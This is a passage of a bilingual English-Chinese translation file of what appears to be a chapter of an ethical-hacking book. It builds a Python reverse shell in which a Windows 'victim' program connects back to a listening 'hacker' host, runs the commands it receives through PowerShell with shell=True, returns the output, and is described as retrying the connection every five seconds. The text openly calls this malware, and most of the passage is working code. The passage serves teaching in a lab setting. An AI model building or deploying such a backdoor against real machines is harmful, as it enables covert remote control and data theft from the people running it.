  zh: 'if __name__ == "__main__":'
- en: hacker_socket = socket.socket(socket.AF_INET,     socket.SOCK_STREAM)
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket = socket.socket(socket.AF_INET,     socket.SOCK_STREAM)
- en: IP = "192.168.74.128"
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: IP = "192.168.74.128"
- en: Port = 8008
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: Port = 8008
- en: socket_address = (IP, Port)
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: socket_address = (IP, Port)
- en: hacker_socket.bind(socket_address)
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.bind(socket_address)
- en: hacker_socket.listen(5)
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.listen(5)
- en: print("listening for incoming connection requests")
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: print("listening for incoming connection requests")
- en: hacker_socket, client_address = hacker_socket.accept()
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket, client_address = hacker_socket.accept()
- en: message = "Message from hacker"
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: message = "Message from hacker"
- en: message_bytes = message.encode()
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: message_bytes = message.encode()
- en: hacker_socket.send(message_bytes)
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.send(message_bytes)
- en: print("Message sent")
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: print("Message sent")
- en: hacker_socket.close()
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.close()
- en: Our hacker program is now complete. Next, we will move to the victim program,
    which will initiate a connection with the hacker.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的黑客程序现在完成了。接下来，我们将转到受害者程序，受害者程序将与黑客建立连接。
- en: Victim's client
  id: totrans-105
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 受害者客户端
- en: 'Go to the Windows 10 machine and create a new project for the victim. The first
    few steps will be similar to the hacker program. Take a look at the following
    code:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 转到 Windows 10 机器，并为受害者创建一个新项目。前几步将与黑客程序相似。请查看以下代码：
- en: import socket
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: 'if __name__ == "__main__":'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 'if __name__ == "__main__":'
- en: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- en: hacker_IP = "192.168.74.128"
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_IP = "192.168.74.128"
- en: hacker_port = 8008
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_port = 8008
- en: hacker_address = (hacker_IP, hacker_port)
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_address = (hacker_IP, hacker_port)
- en: Since we want to connect to the hacker, we will provide the hacker's IP and
    the corresponding port the hacker is listening on.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们要连接到黑客，我们需要提供黑客的 IP 地址和黑客监听的端口。
- en: Next, we will create a tuple for **hacker_address**.
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将为 **hacker_address** 创建一个元组。
- en: 'The next step is to **connect()** with the hacker using the victim''s socket:'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 下一步是使用受害者的 socket 与黑客 **connect()** 连接：
- en: victim_socket.connect(hacker_address)
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.connect(hacker_address)
- en: 'Once this method is called, if the server is listening, we will have a successful
    connection established, otherwise we will see an error message. If you run the
    program now, you will see a connection refused message:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦调用此方法，如果服务器正在监听，我们将成功建立连接，否则我们将看到错误信息。如果现在运行程序，你会看到连接被拒绝的消息：
- en: '![Figure 6.4 – Connection failure'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.4 – 连接失败'
- en: '](image/B14788_06_04.jpg)'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_04.jpg)'
- en: Figure 6.4 – Connection failure
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.4 – 连接失败
- en: 'This is because, if there is no server listening on a certain port, all incoming
    traffic is blocked by default. Remember that in our hacker program, we were sending
    a message? We need to handle that message here, otherwise we would run into errors.
    We can use the **recv** method to receive messages:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 这是因为，如果某个端口上没有服务器在监听，所有传入的流量默认会被阻塞。记得在我们的黑客程序中，我们正在发送一条消息吗？我们需要在这里处理这条消息，否则会遇到错误。我们可以使用
    **recv** 方法接收消息：
- en: data = victim_socket.recv(1024)
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: data = victim_socket.recv(1024)
- en: '**1024** is the number of bytes the socket can read at once. Any data more
    than this number coming from the hacker will be truncated. We can use loops to
    receive more data. For now, this number would be enough.'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: '**1024**是套接字一次可以读取的字节数。来自黑客的数据如果超过这个数量，会被截断。我们可以使用循环来接收更多数据。现在，这个数值已经足够。'
- en: 'Finally, since we receive the data in the form of bytes, we need to decode
    them into a string to print them and later use them in the program if we want:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，由于我们以字节形式接收数据，我们需要将其解码为字符串，以便打印出来，并在程序中稍后使用（如果需要的话）：
- en: print(data.decode())
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: print(data.decode())
- en: victim_socket.close()
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.close()
- en: 'We can close the socket using the **close()** method. The complete program
    is as follows:'
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用**close()**方法关闭套接字。完整的程序如下：
- en: import socket
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: 'if __name__ == "__main__":'
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 'if __name__ == "__main__":'
- en: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- en: hacker_IP = "192.168.74.128"
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_IP = "192.168.74.128"
- en: hacker_port = 8008
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_port = 8008
- en: hacker_address = (hacker_IP, hacker_port)
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_address = (hacker_IP, hacker_port)
- en: victim_socket.connect(hacker_address)
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.connect(hacker_address)
- en: data = victim_socket.recv(1024)
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: data = victim_socket.recv(1024)
- en: print(data.decode())
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: print(data.decode())
- en: victim_socket.close()
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.close()
- en: Now our hacker and victim programs are complete in their simplest form. A hacker
    is listening for incoming connections, and the victim tries to connect with the
    hacker program. Once the connection is established, the hacker sends a message
    to the victim. The victim receives the message and simply prints it. Both parties
    then close their respective connections. What we have learned so far is generic
    socket programming. Once we understand how we can create connections between two
    devices in a network, we can adopt these programs to create malicious programs
    that can allow hackers to perform malicious activities on the victim's computer.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们的黑客和受害者程序在最简单的形式下已经完成。黑客程序正在监听传入的连接，而受害者程序尝试与黑客程序连接。一旦连接建立，黑客就会向受害者发送消息。受害者接收到消息后会将其打印出来。然后，双方关闭各自的连接。到目前为止，我们所学的是通用的套接字编程。一旦我们理解了如何在网络中的两个设备之间建立连接，我们就可以将这些程序应用到创建恶意程序上，允许黑客在受害者的计算机上执行恶意活动。
- en: 'Let''s tie all this together. First, run the hacker program and then run the
    victim''s program. This time, the connection will be properly established and,
    on the hacker''s machine, you will see the following output:'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们将所有内容结合起来。首先，运行黑客程序，然后运行受害者程序。这一次，连接将被正确建立，在黑客的机器上，你将看到以下输出：
- en: '![Figure 6.5 – Hacker''s program'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.5 – 黑客程序'
- en: '](image/B14788_06_05.jpg)'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_05.jpg)'
- en: Figure 6.5 – Hacker's program
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.5 – 黑客程序
- en: 'Similarly, the victim will receive the message and display it on screen:'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 类似地，受害者将接收到消息并在屏幕上显示：
- en: '![Figure 6.6 – Message received by the victim'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.6 – 受害者接收到的消息'
- en: '](image/B14788_06_06.jpg)'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_06.jpg)'
- en: Figure 6.6 – Message received by the victim
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.6 – 受害者接收到的消息
- en: We have completed one part of the puzzle, which is to create a successful connection
    from the victim's machine to the hacker's machine, and received a small message
    at the victim's machine, sent by the hacker. This may not seem like a big task,
    but this is a very powerful tool. Using this, you can essentially take commands
    from the hacker. Design the victim program to run these commands on the machine
    and send the results back to the hacker. In the next section, we will learn how
    to send commands from the hacker's machine to the victim's machine and send the
    results back to the hacker.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经完成了拼图的一部分，即从受害者机器到黑客机器建立了一个成功的连接，并接收到了一个由黑客发送的小消息。这看起来可能不是什么大任务，但它是一个非常强大的工具。利用这个，你基本上可以从黑客那里接收命令。设计受害者程序执行这些命令并将结果发送回黑客。在下一节中，我们将学习如何从黑客机器向受害者机器发送命令，并将结果发送回黑客。
- en: Running commands remotely on the victim's machine
  id: totrans-148
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在受害者机器上远程执行命令
- en: We have already seen in [*Chapter 3*](B14788_03_Final_JC_ePub.xhtml#_idTextAnchor070),
    *Reconnaissance and Information Gathering* (in the *Creating a Python script*
    section), how to run commands on a computer using Python. We will build on that
    knowledge to create a malware that will take commands and execute them on a victim's
    machine. Our previous program just sends one message to the victim and exits.
    This time, we will modify the program to do much more than that.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经在[*第 3 章*](B14788_03_Final_JC_ePub.xhtml#_idTextAnchor070)中看到过，*侦察与信息收集*（在*创建
    Python 脚本*部分），如何使用 Python 在计算机上运行命令。我们将在此基础上构建一个恶意软件，它将接收命令并在受害者机器上执行。我们之前的程序只向受害者发送一条消息然后退出。这一次，我们将修改程序，让它做更多的事情。
- en: 'Open a new project on the Kali machine to execute commands on the victim''s
    machine and create a new file. Let''s start by establishing a connection:'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Kali 机器上打开一个新项目，以便在受害者机器上执行命令并创建一个新文件。我们从建立连接开始：
- en: import socket
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: 'if __name__ == "__main__":'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 'if __name__ == "__main__":'
- en: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- en: IP = "192.168.74.128"
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: IP = "192.168.74.128"
- en: Port = 8008
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: Port = 8008
- en: socket_address = (IP, Port)
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: socket_address = (IP, Port)
- en: hacker_socket.bind(socket_address)
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.bind(socket_address)
- en: hacker_socket.listen(5)
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.listen(5)
- en: print("listening for incoming connection requests")
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: print("监听传入的连接请求")
- en: hacker_socket, client_address = hacker_socket.accept()
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket, client_address = hacker_socket.accept()
- en: 'The next step involves taking the user input for the command we want to run
    on the victim''s machine. Once this input is taken, we must convert it into bytes
    and send it over the connection to the victim program:'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 下一步是获取用户输入的命令，我们将在受害者机器上执行此命令。一旦输入被获取，我们必须将其转换为字节并通过连接发送到受害者程序：
- en: command = input("Enter the command ")
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: command = input("请输入命令 ")
- en: hacker_socket.send(command.encode())
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.send(command.encode())
- en: 'Once the command is sent, the victim side program will take care of executing
    it and return the result. Here, on the hacker program, we will simply receive
    whatever is returned by the victim and print it as a result:'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦命令发送出去，受害者端程序会负责执行它并返回结果。在黑客程序中，我们只是接收受害者返回的结果并将其打印出来：
- en: command_result = hacker_socket.recv(1048)
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: command_result = hacker_socket.recv(1048)
- en: print(command_result.decode())
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: print(command_result.decode())
- en: 'Next, we will put this inside a loop and put an exit condition as well:'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将把它放入一个循环中，并添加退出条件：
- en: 'while True:'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 'while True:'
- en: command = input("Enter the command ")
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: command = input("请输入命令 ")
- en: hacker_socket.send(command.encode())
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.send(command.encode())
- en: 'if command == "stop":'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 'if command == "stop":'
- en: break
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: break
- en: command_result = hacker_socket.recv(1048)
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: command_result = hacker_socket.recv(1048)
- en: print(command_result.decode())
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: print(command_result.decode())
- en: 'The **if** statement makes sure that we can safely exit this loop when we want
    so that we don''t get stuck in an infinite loop. Also, to make sure that we close
    the socket properly if we encounter any error during execution, we will add a
    **try-catch** block for exception handling. The complete hacker program for executing
    commands looks like this:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: '**if** 语句确保我们能够在需要时安全地退出这个循环，从而避免陷入死循环。此外，为了确保在执行过程中遇到任何错误时能够正确关闭套接字，我们会添加一个**try-catch**块进行异常处理。执行命令的完整黑客程序如下所示：'
- en: import socket
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: 'if __name__ == "__main__":'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 'if __name__ == "__main__":'
- en: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- en: IP = "192.168.74.128"
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: IP = "192.168.74.128"
- en: Port = 8008
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: Port = 8008
- en: socket_address = (IP, Port)
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: socket_address = (IP, Port)
- en: hacker_socket.bind(socket_address)
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.bind(socket_address)
- en: hacker_socket.listen(5)
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.listen(5)
- en: print("listening for incoming connection requests")
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: print("监听传入的连接请求")
- en: hacker_socket, client_address = hacker_socket.accept()
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket, client_address = hacker_socket.accept()
- en: print("connection established with ", client_address)
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: print("与 ", client_address, " 建立连接")
- en: 'try:'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 'try:'
- en: 'while True:'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 'while True:'
- en: command = input("Enter the command ")
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: command = input("请输入命令 ")
- en: hacker_socket.send(command.encode())
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.send(command.encode())
- en: 'if command == "stop":'
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 'if command == "stop":'
- en: break
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: break
- en: command_result = hacker_socket.recv(1048)
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: command_result = hacker_socket.recv(1048)
- en: print(command_result.decode())
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: print(command_result.decode())
- en: 'except Exception:'
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 'except Exception:'
- en: print("Exception occured")
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: print("发生异常")
- en: hacker_socket.close()
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.close()
- en: 'On the victim side, we will receive the command that the hacker sends and use
    the **subprocess** module to execute commands, and finally send the results back
    to the hacker. This part will be coded on the Windows 10 machine. Let''s create
    a new project on the Windows machine and try to follow the same steps for creating
    a connection with the hacker program:'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 在受害者端，我们将接收到黑客发送的命令，使用**subprocess**模块执行命令，最后将结果发送回黑客。这部分将在Windows 10机器上进行编码。让我们在Windows机器上创建一个新项目，并尝试按照相同的步骤与黑客程序建立连接：
- en: import socket
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: 'if __name__ == "__main__":'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 'if __name__ == "__main__":'
- en: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- en: hacker_IP = "192.168.74.128"
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_IP = "192.168.74.128"
- en: hacker_port = 8008
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_port = 8008
- en: hacker_address = (hacker_IP, hacker_port)
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_address = (hacker_IP, hacker_port)
- en: victim_socket.connect(hacker_address)
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.connect(hacker_address)
- en: 'As we have seen on the hacker program that we have a **while** loop to send
    commands continuously, we will deploy a similar approach here:'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们在黑客程序中看到的，我们有一个**while**循环来持续发送命令，下面我们也会采用类似的方法：
- en: data = victim_socket.recv(1024)
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: data = victim_socket.recv(1024)
- en: hacker_command = data.decode()
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_command = data.decode()
- en: 'We will add a similar exit condition here, as we did in the hacker program:'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将添加一个类似的退出条件，就像我们在黑客程序中做的那样：
- en: 'if hacker_command == "stop":'
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 'if hacker_command == "stop":'
- en: break
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: break
- en: 'Next, we run the command on the victim computer and obtain a result in string
    format as shown:'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们在受害者计算机上运行命令，并以字符串格式获取结果，如下所示：
- en: output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)
- en: '**powershell.exe** makes sure that we run commands using PowerShell in Windows.
    **capture_output=True** makes sure that we receive a result in the **output**
    variable.'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: '**powershell.exe** 确保我们在Windows中使用PowerShell运行命令。**capture_output=True** 确保我们将结果接收在**output**变量中。'
- en: 'Next, we need to check for errors. If any error occurs during execution of
    the command, we need to handle it properly so that we don''t break the program,
    otherwise we will send the result back to the hacker:'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们需要检查错误。如果命令执行期间发生错误，我们需要妥善处理，以免程序崩溃，否则我们会将结果发送回给黑客：
- en: 'if output.stderr.decode("utf-8") == "":'
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 'if output.stderr.decode("utf-8") == "":'
- en: command_result = output.stdout
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: command_result = output.stdout
- en: 'else:'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: command_result = output.stderr
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: command_result = output.stderr
- en: 'The first condition checks that if there is no error during command execution,
    we set the **command_result** variable to the output of the command, otherwise
    we set **command_result** to the error. Note that by default, this is in the form
    of bytes, so we don''t need to encode it to send it over the network:'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个条件检查是否在命令执行过程中没有错误，如果没有错误，我们将**command_result**变量设置为命令的输出，否则将**command_result**设置为错误。请注意，默认情况下这是以字节形式呈现的，因此我们不需要对其进行编码就能通过网络发送：
- en: victim_socket.send(command_result)
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.send(command_result)
- en: 'Finally, we need to put all this command execution code in a **try-catch**
    block for any exception handling and proper closure of the socket. The complete
    program can be found here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py).'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们需要将所有命令执行代码放在**try-catch**块中，以处理任何异常并确保正确关闭套接字。完整的程序可以在这里找到：[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py)。
- en: 'Let''s try running some commands on the victim''s machine and get back the
    results. First, start the hacker program and then run the victim program. Enter
    the commands in the hacker program and see the results contained therein:'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们尝试在受害者机器上运行一些命令，并获取结果。首先，启动黑客程序，然后运行受害者程序。在黑客程序中输入命令，并查看其中包含的结果：
- en: '![Figure 6.7 – Hacker executing a command on the victim'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: '![图6.7 – 黑客在受害者机器上执行命令'
- en: '](image/B14788_06_07.jpg)'
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_07.jpg)'
- en: Figure 6.7 – Hacker executing a command on the victim
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.7 – 黑客在受害者机器上执行命令
- en: 'Here, you can see that the hacker sends an **ipconfig** command to the victim.
    The victim program reads the command, executes it on the victim, and sends the
    result back to the hacker. There are some minor issues with the program that we
    will now discuss. Firstly, the victim program tries to connect just once with
    the hacker, and if the hacker is not listening, the program will throw an error
    and exit. This is not ideal since we want to connect to the victim whenever we
    want. To do this, we will put the **connect()** method inside the loop so that
    it can attempt to continuously make a connection with the hacker, and when the
    hacker is online, the connection is immediately established. Take a look at the
    code for the victim program here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py).'
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，你可以看到黑客向受害者发送了**ipconfig**命令。受害者程序读取命令，执行命令并将结果返回给黑客。程序中有一些小问题，我们现在来讨论。首先，受害者程序只会尝试与黑客连接一次，如果黑客没有在监听，程序就会抛出错误并退出。这样并不理想，因为我们希望随时能够与受害者建立连接。为了解决这个问题，我们将**connect()**方法放入循环中，这样它就可以不断尝试与黑客建立连接，当黑客在线时，连接会立即建立。请看一下受害者程序的代码：[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py)。
- en: Let's now take a look at the changes made in this program. First, there is an
    outer **while** loop. The purpose of this loop is to constantly try to establish
    a connection with the hacker, and if an error occurs, it waits 5 seconds and then
    tries to reconnect. Once the connection is established inside the loop, there
    is another loop inside that makes sure that multiple commands can be sent by the
    hacker to the victim. This **while** loop can be exited by the hacker by using
    the **stop** command. Lastly, there is a keyboard interrupt exception if you want
    to close the program. Press *Ctrl + C* to exit the program. This way, this program
    won't run indefinitely.
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们来看一下这个程序中的更改。首先，有一个外部的**while**循环。这个循环的目的是不断尝试与黑客建立连接，如果发生错误，它会等待 5 秒钟，然后尝试重新连接。一旦连接建立，在循环内部，还有另一个循环，确保黑客能够向受害者发送多个命令。这个**while**循环可以通过黑客使用**stop**命令来退出。最后，如果你想关闭程序，程序会捕获键盘中断异常。按*Ctrl
    + C*即可退出程序。这样，这个程序就不会无限运行了。
- en: 'So now we have solved our first problem. Now we need to run the victim program
    only once and it will keep on trying to connect with the hacker and, when the
    hacker becomes available, it will connect. Our program has another small issue
    as well. When the hacker program asks to enter a command, if we just press *Enter*,
    it will cause problems because **Enter** is not a valid command. We also need
    to handle that as well. To handle it, we can simply include a check to make sure
    that the hacker does not enter an empty command. To do this, enter the following
    commands:'
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经解决了第一个问题。接下来，我们只需要运行一次受害者程序，它就会不断尝试与黑客建立连接，当黑客变得可用时，它就会连接上。我们的程序还有一个小问题。当黑客程序要求输入命令时，如果我们直接按*Enter*，就会出现问题，因为**Enter**并不是一个有效的命令。我们还需要处理这个问题。为了处理这个问题，我们可以简单地添加一个检查，确保黑客不会输入空命令。为此，输入以下命令：
- en: 'if command == "":'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 'if command == "":'
- en: continue
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: continue
- en: We will put this check both in the hacker's as well as the victim's program.
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在黑客程序和受害者程序中都加入这个检查。
- en: 'Lastly, if you notice carefully, we can only send and receive data that is
    less than 1,024 bytes, as defined in our receive function. Any data more than
    this will be truncated. To see it in more detail, go to the Windows machine and
    run any command whose result is more than 1,024 bytes. For instance, let''s take
    a look at the **systeminfo** command. This command gives out the system information
    and has a relatively large output:'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，如果你仔细观察，会发现我们只能发送和接收小于 1,024 字节的数据，因为我们在接收函数中定义了这个限制。任何超过这个大小的数据都会被截断。为了更详细地查看，去
    Windows 机器上运行任何输出超过 1,024 字节的命令。例如，让我们来看一下**systeminfo**命令。这个命令输出系统信息，结果相对较大：
- en: '![Figure 6.8 – systeminfo result'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.8 – systeminfo 结果'
- en: '](image/B14788_06_08.jpg)'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_08.jpg)'
- en: Figure 6.8 – systeminfo result
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.8 – systeminfo 结果
- en: 'Now, run the same command using your hacker program. Your output will be something
    like this:'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，使用你的黑客程序运行相同的命令。你的输出将类似于下面的内容：
- en: '![Figure 6.9 – Truncated command result'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.9 – 截断的命令结果'
- en: '](image/B14788_06_09.jpg)'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_09.jpg)'
- en: Figure 6.9 – Truncated command result
  id: totrans-240
